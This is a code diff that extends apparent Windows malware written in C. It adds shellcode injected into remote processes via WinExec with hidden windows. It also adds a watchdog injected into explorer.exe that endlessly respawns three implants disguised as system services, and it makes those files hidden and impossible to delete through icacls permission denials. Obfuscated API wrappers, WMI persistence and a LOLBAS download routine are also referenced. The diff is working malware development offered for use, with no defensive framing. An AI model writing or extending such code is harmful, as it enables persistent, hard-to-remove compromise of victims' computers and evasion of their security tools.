@@ -512,12 +512,24 @@ void obf_sys_inject_process(void) {
     if (targetKernel32Base == 0) targetKernel32Base = kernel32Base;
     DWORD_PTR targetWinExec = targetKernel32Base + winExecOffset;
     
-    unsigned char shellcode[19] = {
-        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0xFF, 0xE0
+    /* Build shellcode: mov rdx, 0; mov rax, WinExec; call rax; xor ecx, ecx; mov rax, ExitThread; jmp rax */
+    unsigned char shellcode[32] = {
+        0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00,  // mov rdx, 0 (uCmdShow = SW_HIDE)
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, WinExec
+        0xFF, 0xD0,                                  // call rax
+        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,  // mov rcx, 0 (exit code)
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, ExitThread
+        0xFF, 0xE0                                   // jmp rax
     };
     memcpy(shellcode + 9, &targetWinExec, 8);
+    
+    /* Get ExitThread address for clean thread exit */
+    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
+    if (pExitThread) {
+        DWORD_PTR exitThreadOffset = (DWORD_PTR)pExitThread - kernel32Base;
+        DWORD_PTR targetExitThread = targetKernel32Base + exitThreadOffset;
+        memcpy(shellcode + 25, &targetExitThread, 8);
+    }
     
     LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteCode) {
@@ -663,12 +675,165 @@ void obf_sys_hollow_process(void) {
     
     obf_junk_delay();
     
-    obf_WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10), &remoteImage, sizeof(remoteImage), NULL);
-    ctx.Rcx = (DWORD64)remoteImage;
-    ctx.Rip = (DWORD64)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-    SetThreadContext(pi.hThread, &ctx);
-    ResumeThread(pi.hThread);
-    CloseHandle(pi.hThread); CloseHandle(pi.hProcess); free(payload);
+/* === Injected Watchdog (replaces broken hollow process) ===
+ * Injects a simple infinite loop into explorer.exe that:
+ * 1. Checks if all 3 shadow processes are running
+ * 2. Respawns any missing ones
+ * 3. Sleeps 30 seconds
+ * 4. Repeats forever
+ * 
+ * This runs inside explorer.exe, so even if ALL our .exe files are
+ * deleted, the watchdog in explorer.exe will recreate them.
+ */
+void obf_sys_hollow_process(void) {
+    /* Find explorer.exe PID */
+    DWORD pid = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    if (pid == 0) return;
+    
+    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return;
+    
+    /* Build paths for the 3 shadows */
+    char localAppData[MAX_PATH];
+    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
+    
+    char path1[MAX_PATH], path2[MAX_PATH], path3[MAX_PATH];
+    snprintf(path1, sizeof(path1), "%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe", localAppData);
+    snprintf(path2, sizeof(path2), "%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe", localAppData);
+    snprintf(path3, sizeof(path3), "%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe", localAppData);
+    
+    /* Allocate memory for paths in remote process */
+    SIZE_T p1len = strlen(path1) + 1;
+    SIZE_T p2len = strlen(path2) + 1;
+    SIZE_T p3len = strlen(path3) + 1;
+    
+    LPVOID rPath1 = obf_VirtualAllocEx(hProc, NULL, p1len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rPath2 = obf_VirtualAllocEx(hProc, NULL, p2len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rPath3 = obf_VirtualAllocEx(hProc, NULL, p3len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!rPath1 || !rPath2 || !rPath3) {
+        if (rPath1) VirtualFreeEx(hProc, rPath1, 0, MEM_RELEASE);
+        if (rPath2) VirtualFreeEx(hProc, rPath2, 0, MEM_RELEASE);
+        if (rPath3) VirtualFreeEx(hProc, rPath3, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return;
+    }
+    
+    obf_WriteProcessMemory(hProc, rPath1, path1, p1len, NULL);
+    obf_WriteProcessMemory(hProc, rPath2, path2, p2len, NULL);
+    obf_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
+    
+    /* Get WinExec and Sleep addresses */
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    HMODULE hKernel32 = GetModuleHandleA(kernel32);
+    FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
+    FARPROC pSleep = GetProcAddress(hKernel32, "Sleep");
+    
+    DWORD_PTR k32Base = (DWORD_PTR)hKernel32;
+    DWORD_PTR weOffset = (DWORD_PTR)pWinExec - k32Base;
+    DWORD_PTR sOffset = (DWORD_PTR)pSleep - k32Base;
+    
+    /* Find kernel32 base in remote process */
+    DWORD_PTR remoteK32 = 0;
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+    
+    char *enumProc = obf_enumproc();
+    char *getBaseName = obf_getbasename();
+    typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
+    typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
+    EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProc);
+    GetMBN_t pGetBaseName = (GetMBN_t)GetProcAddress(hKernel32, getBaseName);
+    
+    if (pEnum && pGetBaseName) {
+        if (pEnum(hProc, hMods, sizeof(hMods), &cbNeeded)) {
+            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+                char szModName[MAX_PATH];
+                if (pGetBaseName(hProc, hMods[i], szModName, sizeof(szModName))) {
+                    if (_stricmp(szModName, "kernel32.dll") == 0) {
+                        remoteK32 = (DWORD_PTR)hMods[i];
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    if (remoteK32 == 0) remoteK32 = k32Base;
+    
+    DWORD_PTR rWinExec = remoteK32 + weOffset;
+    DWORD_PTR rSleep = remoteK32 + sOffset;
+    
+    /* Shellcode: infinite loop that calls WinExec(path, 0) for each shadow,
+     * then Sleep(30000), then jumps back to start */
+    /* x64 calling convention: RCX=arg1, RDX=arg2 */
+    unsigned char shellcode[128];
+    int off = 0;
+    
+    /* loop_start: */
+    /* mov rcx, rPath1; mov rdx, 0; mov rax, rWinExec; call rax */
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
+    memcpy(shellcode + off, &rPath1, 8); off += 8;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
+    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
+    memcpy(shellcode + off, &rWinExec, 8); off += 8;
+    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    
+    /* mov rcx, rPath2; mov rdx, 0; mov rax, rWinExec; call rax */
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
+    memcpy(shellcode + off, &rPath2, 8); off += 8;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
+    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
+    memcpy(shellcode + off, &rWinExec, 8); off += 8;
+    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    
+    /* mov rcx, rPath3; mov rdx, 0; mov rax, rWinExec; call rax */
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
+    memcpy(shellcode + off, &rPath3, 8); off += 8;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC2;
+    shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
+    memcpy(shellcode + off, &rWinExec, 8); off += 8;
+    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    
+    /* mov rcx, 30000; mov rax, rSleep; call rax */
+    shellcode[off++] = 0x48; shellcode[off++] = 0xC7; shellcode[off++] = 0xC1;
+    shellcode[off++] = 0x30; shellcode[off++] = 0x75; shellcode[off++] = 0x00; shellcode[off++] = 0x00;
+    shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
+    memcpy(shellcode + off, &rSleep, 8); off += 8;
+    shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
+    
+    /* jmp loop_start */
+    int jmpOffset = -(off + 2); /* target(0) - nextInstruction(off+2) */
+    shellcode[off++] = 0xEB;
+    shellcode[off++] = (signed char)jmpOffset;
+    
+    LPVOID rCode = obf_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!rCode) {
+        CloseHandle(hProc);
+        return;
+    }
+    
+    obf_WriteProcessMemory(hProc, rCode, shellcode, off, NULL);
+    
+    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
+    if (hThread) CloseHandle(hThread);
+    CloseHandle(hProc);
 }
 
 /* === Obfuscated WMI persistence === */
@@ -702,21 +867,38 @@ void obf_sys_wmi_persistence(void) {
     DeleteFileA(psPath);
 }
 
-/* === Obfuscated harden files === */
+/* === Obfuscated harden files ===
+ * Prevents deletion by:
+ * 1. Denying delete permissions via icacls
+ * 2. Hiding files (hidden + system attributes)
+ * 3. Removing inherited permissions
+ */
 void obf_sys_harden_files(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
-    char cmd[2048];
-    char *icacls = obf_icacls();
-    snprintf(cmd, sizeof(cmd),
-        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" /deny Everyone:(DE,DC) /c /q && "
-        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe\" /deny Everyone:(DE,DC) /c /q && "
-        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe\" /deny Everyone:(DE,DC) /c /q",
-        icacls, localAppData,
-        icacls, localAppData,
-        icacls, localAppData);
-    sys_run_command(cmd);
+    const char *files[] = {
+        "ElevationService.exe",
+        "CrashHandler.exe",
+        "NotifyService.exe"
+    };
+    
+    for (int i = 0; i < 3; i++) {
+        char path[MAX_PATH];
+        snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
+                 localAppData, files[i]);
+        
+        /* Set hidden + system attributes */
+        SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        
+        /* Remove all inherited permissions, deny delete for Everyone */
+        char cmd[1024];
+        char *icacls = obf_icacls();
+        snprintf(cmd, sizeof(cmd),
+            "%s \"%s\" /inheritance:r /deny Everyone:(DE,DC,WDAC,WO) /c /q",
+            icacls, path);
+        sys_run_command(cmd);
+    }
 }
 
 /* === Obfuscated LOLBAS download === */
